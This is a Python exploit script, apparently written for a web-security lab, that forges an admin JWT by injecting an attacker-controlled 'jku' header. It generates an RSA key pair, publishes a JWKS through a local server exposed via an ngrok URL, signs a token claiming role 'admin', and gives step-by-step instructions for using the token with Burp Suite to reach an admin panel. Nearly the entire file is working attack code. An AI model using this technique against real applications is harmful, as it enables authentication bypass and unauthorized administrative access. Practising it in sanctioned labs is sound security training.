from jwcrypto import jwk
import jwt
import json

# This script is used to generate a malicious JWT token with the "admin" role, signed with MY OWN RSA key pair.
# The public key is added to the JWKS (JSON Web Key Set) with a "kid" (key ID) of choice, and the most important thing is that the token header points to our JWKS URL,
# because as it is possible to observe from the Burp intercepted requests, the token header (which is Base64URL encoded) contains the "jku" field
# that actually points to the JWKS URL (which is the URL of the server serving the JWKS, i.e. the location from which the public key is fetched).
# Therefore, we should run a local server to serve the JWKS and update the "jku" field in the token header with the correct URL of our JWKS,
# then update the token header with the "kid" field set to the same "kid" we used in the JWKS and the payload with the "admin" role, and finally sign the token with the private key.
# Now, we have a malicious JWT token that will be accepted by the server and that can be used to access the admin panel of the application.

# Step 1: Generate an RSA key pair (private and public key)
# Generate RSA private key:  openssl genrsa -out priv.pem 2048
# Generate RSA public  key:  openssl rsa -in priv.pem -pubout -out pub.pem

# Step 2: Load the public key and create a JWKS with a "kid" of choice
key = jwk.JWK.from_pem(open("pub.pem","rb").read())

key_dict = json.loads(key.export_public())
key_dict["kid"] = "crisTheEvil"

jwks = {"keys": [key_dict]}

with open("jwks.json", "w") as f:
    json.dump(jwks, f)

print("\nJWKS created and saved to jwks.json!\n")

# Step 3: Generate a JWT token with the "admin" role, signed with our own private key, and with the header pointing to our JWKS URL
private_key = open("priv.pem").read()

token = jwt.encode(
    {
        "sub": "admin",
        "user_id": 1,
        "role": "admin"
    },
    private_key,
    algorithm="RS256",
    headers={
        "jku": "https://dwindle-drippy-canola.ngrok-free.dev/jwks.json",    # this is the URL (provided by ngrok) of the server serving the JWKS
        "kid": "crisTheEvil"
    }
)

print(token)

# Step 4: Run a local server to serve the JWKS by running:  python3 -m http.server 8000
# Step 5: Run ngrok in a separate terminal to expose the local server to the Internet by running:  ngrok http 8000
# Step 6: Take this script and update the "jku" field in the token header with the URL provided by ngrok
# Step 7: Run the script to generate the malicious JWT token and use it to access the admin panel of the application using Burp Suite
